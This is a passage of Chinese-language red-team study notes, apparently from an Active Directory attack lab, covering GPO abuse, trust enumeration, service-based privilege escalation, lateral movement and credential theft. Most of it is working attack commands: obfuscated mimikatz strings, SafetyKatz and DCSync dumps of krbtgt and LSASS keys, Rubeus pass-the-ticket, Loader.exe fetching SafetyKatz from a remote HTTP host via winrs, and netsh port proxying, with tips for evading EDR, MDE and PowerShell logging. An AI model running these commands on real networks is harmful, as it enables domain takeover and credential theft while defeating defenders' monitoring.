<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="variable">$1</span>=<span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="variable">$2</span>=<span class="string">&quot;e&quot;</span></span><br><span class="line"><span class="variable">$3</span>=<span class="string">&quot;k&quot;</span></span><br><span class="line"><span class="variable">$4</span>=<span class="string">&quot;u&quot;</span></span><br><span class="line"><span class="variable">$5</span>=<span class="string">&quot;r&quot;</span></span><br><span class="line"><span class="variable">$6</span>=<span class="string">&quot;l&quot;</span></span><br><span class="line"><span class="variable">$7</span>=<span class="string">&quot;a&quot;</span></span><br><span class="line"><span class="variable">$8</span>=<span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="variable">$9</span>=<span class="string">&quot;y&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$1</span>+<span class="variable">$2</span>+<span class="variable">$3</span>+<span class="variable">$4</span>+<span class="variable">$5</span>+<span class="variable">$6</span>+<span class="variable">$1</span>+<span class="variable">$7</span>+<span class="variable">$8</span>+<span class="variable">$8</span>+<span class="variable">$2</span>+<span class="variable">$3</span>+<span class="variable">$2</span>+<span class="variable">$9</span>+<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Mimi</span> <span class="literal">-Command</span> <span class="variable">$a</span></span><br></pre></td></tr></table></figure>




<h2 id="OPSEC"><a href="#OPSEC" class="headerlink" title="OPSEC"></a>OPSEC</h2><h3 id="域票据"><a href="#域票据" class="headerlink" title="域票据"></a>域票据</h3><p>mimiktaz的金票是10年，查看域规则的票据过期时间，伪造的票据过期时间应当尽量与域策略统一。</p>
<h3 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h3><p>通过logon次数来规避使用极少使用的用户</p>
<h2 id="04-GPO-OU"><a href="#04-GPO-OU" class="headerlink" title="04 GPO,OU"></a>04 GPO,OU</h2><h3 id="GPO"><a href="#GPO" class="headerlink" title="GPO"></a>GPO</h3><p>将一个组策略应用给权限比较宽松的OU，是比较常见的滥用场景</p>
<p>获取域内所有组策略（GPO）<br>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainGPO</span></span><br></pre></td></tr></table></figure>

<p>进查看displayname</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainGPO</span> | <span class="built_in">select</span> displayname</span><br></pre></td></tr></table></figure>

<h3 id="OU"><a href="#OU" class="headerlink" title="OU"></a>OU</h3><p>列出OU</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainOU</span><br></pre></td></tr></table></figure>

<p>根据上一条命令，可以通过GPlink的CN来获取指定的GPO</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-domainGPO -Identity &#x27;&#123;xxxxxxx-xxxx-xxxx-xxxx-xxxxxx&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>查询在指定OU中的 计算机 有哪些</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-domainOU</span> <span class="literal">-Identity</span> Devops).distinguishedname| %&#123;<span class="built_in">Get-domainComputer</span> <span class="literal">-Search</span> <span class="variable">$_</span>&#125; |<span class="built_in">select</span> name</span><br></pre></td></tr></table></figure>

<h3 id="受限组"><a href="#受限组" class="headerlink" title="受限组"></a>受限组</h3><p><strong>“受限组”是什么？</strong></p>
<ul>
<li>是一种 组策略设置，用于强制某个本地组（比如本地 Administrators）中只能包含特定的成员。</li>
</ul>
<p>换句话说，你用“受限组”配置了一个本地组，那么无论别人手动加了什么用户进去，都会被策略重写成你设定的那一套。</p>
<p><strong>“将域组添加到本地组”</strong></p>
<ul>
<li>比如你想让一个 AD 域里的组（如 DOMAIN\Admins）或者某个用户自动变成本地机器上的管理员，那你可以通过“受限组”来实现这个操作。</li>
</ul>
<p>攻击者可以</p>
<p>1.用“受限组”把自己加入所有机器的 Administrators！</p>
<p>2.然后每台机器都自动把他加入进去（持续生效）！</p>
<p>枚举</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainGPOLocalGroup</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/8270543.html">https://www.cnblogs.com/linuxsec/articles/8270543.html</a></p>
<p>获取用户被GPO配置为哪几个机器的本地特殊组成员</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainGPOUserLocalGroupMapping</span> <span class="literal">-Identity</span> Student1 <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>列出针对某台机器，GPO中配置了本地组的账户成员</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainGPOComputerLocalGroupMapping</span> <span class="literal">-ComputerIdentity</span> dcorp<span class="literal">-student1</span></span><br></pre></td></tr></table></figure>

<h3 id="GPO滥用"><a href="#GPO滥用" class="headerlink" title="GPO滥用"></a>GPO滥用</h3><p>截取NTLM凭据，重放至DC，通过修改GPO的 <code>gPCFileSysPath</code> （定义组策略对象加载策略的路径），指向我们自定义的恶意组策略路径模板。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more">https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more</a></p>
</blockquote>
<h2 id="05-domain-Trusts"><a href="#05-domain-Trusts" class="headerlink" title="05 domain Trusts"></a>05 domain Trusts</h2><h3 id="外部信任"><a href="#外部信任" class="headerlink" title="外部信任"></a>外部信任</h3><p>多个外部信任之间，即便有信任的情况下，也需要被访问方配置明确指定访问的资源才可以访问.</p>
<p>所以企业建设采用多个林与林是相对安全的选择</p>
<h3 id="Forest-Trusts"><a href="#Forest-Trusts" class="headerlink" title="Forest Trusts"></a>Forest Trusts</h3><p><code>Forest Trusts</code> 指多个林根之间互相信任，林交叉</p>
<h3 id="枚举域名信任"><a href="#枚举域名信任" class="headerlink" title="枚举域名信任"></a>枚举域名信任</h3><p>获取所有域信任</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainTrust</span></span><br></pre></td></tr></table></figure>

<p>获得指定域的所有域信任</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainTrust</span> <span class="literal">-Domain</span> us.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADTrust</span> <span class="literal">-Identity</span> us.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<h3 id="枚举-Forest"><a href="#枚举-Forest" class="headerlink" title="枚举 Forest"></a>枚举 Forest</h3><p>当前域林的所有信息</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Forest</span></span><br></pre></td></tr></table></figure>

<p>获取指定域林的信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Forest</span> <span class="literal">-Forest</span> eurocorp.local </span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADForest</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Forest</span> <span class="literal">-Identity</span> eurocorp.local</span><br></pre></td></tr></table></figure>

<h3 id="获取指定域林中的域"><a href="#获取指定域林中的域" class="headerlink" title="获取指定域林中的域"></a>获取指定域林中的域</h3><p>获取一个指定域林中的所有域</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Forestdomain</span></span><br></pre></td></tr></table></figure>

<p>获得指定域林中的域</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Forestdomain</span> <span class="literal">-Forest</span> eurocorp.local</span><br></pre></td></tr></table></figure>

<p>当与其他域林有双向信任的情况下，也可以在这里指定其他域林然后查看他域中的信任关系</p>
<p>(注意，如果仅和其他域林中的根域有双向信任，而与其子域名没有信任的话，则无法对其子域<code>Get-domainTrust</code>)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Forestdomain</span> <span class="literal">-Forest</span> eurocorp.local | %&#123;<span class="built_in">Get-ForestTrust</span> <span class="literal">-domain</span> <span class="variable">$_</span>.name&#125;</span><br></pre></td></tr></table></figure>



<p>ad module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-ADForest</span>).domains</span><br></pre></td></tr></table></figure>

<h3 id="列出林中的全局编录服务器（枚举作为全局目录的DC控制器）"><a href="#列出林中的全局编录服务器（枚举作为全局目录的DC控制器）" class="headerlink" title="列出林中的全局编录服务器（枚举作为全局目录的DC控制器）"></a>列出林中的全局编录服务器（枚举作为全局目录的DC控制器）</h3><p>当前林</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ForestGloblCatalog</span></span><br></pre></td></tr></table></figure>

<p>指定林</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ForestGlobalCatalog</span> <span class="literal">-Forest</span> eurocorp.local</span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADForest</span> |<span class="built_in">select</span> <span class="literal">-ExpandProperty</span> GlobalCatalogs</span><br></pre></td></tr></table></figure>

<h3 id="枚举域林之间信任"><a href="#枚举域林之间信任" class="headerlink" title="枚举域林之间信任"></a>枚举域林之间信任</h3><p>枚举域林之间信任关系</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ForestTrust</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ForestTrust</span> <span class="literal">-Forest</span> eurocorp.local</span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> <span class="string">&quot;msDS-TrustForestTrustInfo&quot;</span> <span class="operator">-ne</span> <span class="string">&quot;<span class="variable">$null</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="06-权限提升-Privilege-Escalation"><a href="#06-权限提升-Privilege-Escalation" class="headerlink" title="06 权限提升(Privilege Escalation)"></a>06 权限提升(Privilege Escalation)</h2><ul>
<li>缺少补丁</li>
<li>自动部署和明文中的自动登录密码</li>
<li>任何用户都可以以SYSTEM身份运行MSI(AlwavsInstalElevated)</li>
<li>配置错误的服务</li>
<li>DLL劫持等</li>
<li>Kerberos和 NTLM 转发</li>
</ul>
<p>枚举工具：</p>
<p>（有点老的工具）</p>
<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p>
<p>（比较新还在维护的）<br><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p>
<p>winpeas</p>
<h3 id="1-缺陷服务枚举"><a href="#1-缺陷服务枚举" class="headerlink" title="1.缺陷服务枚举"></a>1.缺陷服务枚举</h3><p>列出当前主机上服务和对应的服务账户名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> Win32_Service | <span class="built_in">Select-Object</span> Name, DisplayName, StartName, State | <span class="built_in">Format-Table</span> <span class="literal">-AutoSize</span></span><br></pre></td></tr></table></figure>

<p>带有空格但是没有引号包裹的服务</p>
<p>以这个为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\WebServer\Abyss Web Serkerabyssws.exe -service</span><br></pre></td></tr></table></figure>
<p>没有引号包裹导致，可以通过上传 <code>C:\WebServer\Abyss.exe</code> 恶意载荷，重启服务即可得到权限。</p>
<p>PowerUP</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ServiceUnquoted</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>获取当前用户有修改二进制执行路径或参数的服务</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ModifiableServiceFile</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>获取当前用户能够有权限修改服务配置的服务</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ModifiableService</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>通常是服务权限 <code>DSCL</code> 过松</p>
<p>(服务权限结尾的 <code>WD</code> 代表的是所有人)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe sdshow snmtrap</span><br></pre></td></tr></table></figure>

<p>要注意的是，更改服务配置这种操作，连MDE这种白痴都会感知到。</p>
<p>执行所有check</p>
<p>PowerUP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Allchecks</span><br></pre></td></tr></table></figure>

<p>这里 <code>Invoke-ServiceAbuse</code> 会给一个用户添加localadmin 如果没有指定的话就是创建john用户然后给他加个.</p>
<p>powerUP abuse</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help Invoke-ServiceAbuse</span><br></pre></td></tr></table></figure>


<p>Privesc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PrivEscCheck</span><br></pre></td></tr></table></figure>

<p>winpeas</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeasx64.exe</span><br></pre></td></tr></table></figure>

<h3 id="2-本身就易受攻击的高权服务"><a href="#2-本身就易受攻击的高权服务" class="headerlink" title="2.本身就易受攻击的高权服务"></a>2.本身就易受攻击的高权服务</h3><p>未授权漏洞导致Jenkins可以直接执行命令，从而获得高权</p>
<h3 id="3-NTLM-KRB中继攻击"><a href="#3-NTLM-KRB中继攻击" class="headerlink" title="3.NTLM&#x2F;KRB中继攻击"></a>3.NTLM&#x2F;KRB中继攻击</h3><p>不用直接尝试破解密码，建议考虑中继利用做端点身份验证等</p>
<h2 id="07-横向移动"><a href="#07-横向移动" class="headerlink" title="07 横向移动"></a>07 横向移动</h2><p>powershell交互式</p>
<blockquote>
<p>PowerShell Remoting（如通过 Enter-PSSession 或 Invoke-Command）默认使用 WinRM（Windows Remote Management 5898） 服务进行通信，而该服务的默认安全策略要求远程用户在目标计算机上具有<strong>管理员权限</strong>才能成功建立远程会话。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-PSSession</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession</span><br></pre></td></tr></table></figure>

<p>powershell非交互式</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-command</span> <span class="literal">-Scriptblock</span>&#123;<span class="built_in">set</span> <span class="variable">$ENV:computername</span>;<span class="built_in">set</span> <span class="variable">$ENV:username</span>&#125; <span class="literal">-ComputerName</span> dcorp<span class="literal">-adminsrv</span></span><br></pre></td></tr></table></figure>

<p>批量执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-command</span> <span class="literal">-Scriptblock</span>&#123;<span class="built_in">set</span> <span class="variable">$ENV:computername</span>;<span class="built_in">set</span> <span class="variable">$ENV:username</span>&#125; <span class="literal">-ComputerName</span> (<span class="built_in">cat</span> C:/servers.txt)</span><br></pre></td></tr></table></figure>

<p>批量执行脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-FilePath</span> <span class="string">&quot;C:\script\Get-PassHashes.ps1&quot;</span> <span class="literal">-ComputerName</span> (<span class="built_in">Get-Content</span> <span class="string">&quot;C:/servers.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>本地已经加载了脚本，于远程服务器上执行函数</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ScriptBlock</span> <span class="variable">$</span>&#123;function:<span class="built_in">Get-PassHashes</span>&#125; <span class="literal">-ComputerName</span> (<span class="built_in">Get-Content</span> <span class="string">&quot;C:/servers.txt&quot;</span>) <span class="literal">-ArgumentList</span> </span><br></pre></td></tr></table></figure>

<p>获得一个session，然后指定session执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sess</span>  = <span class="built_in">New-PSession</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Session</span> <span class="variable">$sess</span> <span class="literal">-ScriptBlock</span> &#123;<span class="variable">$proc</span> = <span class="built_in">Get-Process</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Session</span> <span class="variable">$sess</span> <span class="literal">-ScriptBlock</span> &#123;<span class="variable">$proc</span>.name&#125; </span><br></pre></td></tr></table></figure>

<p>因为powershell远程会全系统转录并且留下命令执行记录，可以通过使用winrs替换PSRemote，规避掉留下日志。者能够绕过MDE 但MDI还是会有记录</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-remote</span>:server1 <span class="literal">-u</span>:server1\administrator <span class="literal">-p</span>:Pssword@<span class="number">1234</span> hostname</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/bohops/WSMan-WinRM">https://github.com/bohops/WSMan-WinRM</a></p>
</blockquote>
<h2 id="08-相关敏感凭据提取"><a href="#08-相关敏感凭据提取" class="headerlink" title="08 相关敏感凭据提取"></a>08 相关敏感凭据提取</h2><p>LSASS</p>
<p>为了避免触发edr，所以需要在不触及LSASS进程的情况下获取票据</p>
<p>转储 SAM hive 得到本地凭据</p>
<p>转储 LSA Secrets&#x2F;SECURITY hive 得到服务密码，域缓存凭证。</p>
<p>dpapi 凭据管理器&#x2F;保险库，浏览器cookies，凭据，Azure Token</p>
<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><h4 id="DC中dump所有域凭据"><a href="#DC中dump所有域凭据" class="headerlink" title="DC中dump所有域凭据"></a>DC中dump所有域凭据</h4><p>注意，从DC上lsa的dump出的没有aeskey，只有dcsync才能导出aeskey</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;lsadump::lsa /patch&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#SafetyKatz</span></span><br><span class="line">lsadump::evasive<span class="literal">-lsa</span></span><br></pre></td></tr></table></figure>


<h4 id="dump凭据-dump-credentials"><a href="#dump凭据-dump-credentials" class="headerlink" title="dump凭据 dump credentials"></a>dump凭据 dump credentials</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlas::ekeys</span><br></pre></td></tr></table></figure>

<p>Safekatz dump</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/SafetyKatz">https://github.com/GhostPack/SafetyKatz</a></p>
</blockquote>
<p><strong>使用 <code>loader.exe</code> 来运行</strong></p>
<p>或者impacket</p>
<h4 id="哈希传递-pth"><a href="#哈希传递-pth" class="headerlink" title="哈希传递(pth)"></a>哈希传递(pth)</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="string">&quot;sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /aes256:&lt;aeskey&gt; /run:cmd.exe&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用这个命令将会以logon type 9 启动一个会话 (与runas &#x2F;netonly相同)</p>
<p>要注意 <code>logon type 9</code> 情况下，只有访问远程资源时才会使用新凭据。 而且这要求管理员才能使用</p>
<p><strong>小技巧</strong>：</p>
<p><strong>以及，<code>Loader.exe</code> 可以远程加载exe执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Loader.exe -Path http://172.16.100.1/SafetyKatz.exe sekurlsa::evaskeys exit</span><br></pre></td></tr></table></figure>

<p>配合winrs使用，在远程主机上执行,<strong>(这里 <code>ekeys</code> 被重命名为了 <code>evasive-keys</code>，为了规避关键字监测)</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:dcorp<span class="literal">-mgmt</span> <span class="string">&quot;cmd /c C:\Users\Public\Loader.exe -path http://172.16.100.1/SafetyKatz.exe &quot;</span></span><br><span class="line">sekurlsa::evasive<span class="literal">-keys</span> <span class="keyword">exit</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>通过netsh将http.server代理到目标本地，来规避一部分网络检测</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$null</span> | winrs <span class="literal">-r</span>:dcorp<span class="literal">-mgmt</span> <span class="string">&quot;netsh interface portproxy add v4tov4 listenport=8080 listenAddress=0.0.0.0 connectport=8888 connectaddress=172.16.100.1&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后只需要在本地加载即可</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$null</span> | winrs <span class="literal">-r</span>:dcorp<span class="literal">-mgmt</span> <span class="string">&quot;cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit&quot;</span></span><br></pre></td></tr></table></figure>

<p>在演示时，导出了 <code>svcadmin</code> 的凭证， 输出其账户对应的 <code>session</code> 属性为 <code>Service from 0</code></p>
<p>这代表着这台在这台机器上有一个服务但是以 <code>svcadmin</code> 管理员账户权限运行，这种情况导出将会提供明文的密码.</p>
<p><strong>vault凭据</strong></p>
<p><code>rdp</code>、<code>计划任务</code>等操作使用的凭据都保存在windows的(Vault)凭据库中，这里也用mimikatz 或者 <code>Invoke-Mimi.ps1</code> 进行导出即可。</p>
<p>因为他的command并不常见，所以通常来说不会被拦截住.</p>
<p>可以和applocker的限制的部分我们做法一样，可以在 <code>Invoke-Mimi.ps1</code> 的末尾加上这部分</p>
<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Mimi</span> <span class="literal">-Command</span> <span class="string">&#x27;&quot;token::elevate&quot; &quot;vault::cred /patch&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>sekurlsa::ekeys获取的是来自lsass内存中的凭据和aes、rc4的key等，而vault则是解密并显示<code>windows vault</code>中存储的明文 <code>用户名</code>&#x2F;<code>密码</code>等</strong></p>
<p>这阿三说，”保险库凭据等同于dpapi”</p>
<p>我感觉是属于一部分</p>
<hr>
<h4 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h4><p>DCSync导出krbtgt凭据  </p>
<p>要注意通常情况下DCSync需要DA（domain admin）才可以做</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe <span class="string">&quot;lsadump::dcsync /user:dcorp\krbtgt&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="PS历史命令记录"><a href="#PS历史命令记录" class="headerlink" title="PS历史命令记录"></a>PS历史命令记录</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-PSReadLineOption</span></span><br></pre></td></tr></table></figure>

<p>注意，在2024年11月左右的更新之后，这个文件<code>Host_history.txt</code>将不会记录下面这条<code>ConvertTo-SecureString</code>,以避免暴露明文密码。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Password@123&quot;</span> <span class="literal">-AsPlaintext</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Creds</span> = System.Management.Automation.PSCredential (<span class="string">&quot;dcorp/administrator&quot;</span>,<span class="variable">$pass</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enter-PSSession</span> <span class="literal">-credential</span> Creds <span class="literal">-ComputerName</span> <span class="string">&quot;dcorp-dc&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="票据利用"><a href="#票据利用" class="headerlink" title="票据利用"></a>票据利用</h4><p>要注意的是这个Rubues获取票据的操作会覆盖当前的票据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubues.exe asktgt /user:administrator /rc4:&lt;ntlmhash&gt; /ptt</span><br></pre></td></tr></table></figure>

<p>下面这个需要本地管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubues.exe asktgt /user:administrator /aes256:&lt;aeskey&gt; /opsec /createnetonly:C:\windows\system32\cmd.exe /show /ptt</span><br></pre></td></tr></table></figure>

<hr>
<p>加载利用 <code>Rubeus</code>，注：<code>/ptt</code>在该进程中注入票据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Loader.exe <span class="literal">-path</span> C:\AD\tools\Rubeus.exe <span class="literal">-args</span> asktgt /user:svcadmin /aes256:xxxxxxxxxxxxxxxxxxx /opsec /createnetonly:C:\windows\system32\cmd.exe /show /ptt</span><br></pre></td></tr></table></figure>

<blockquote>
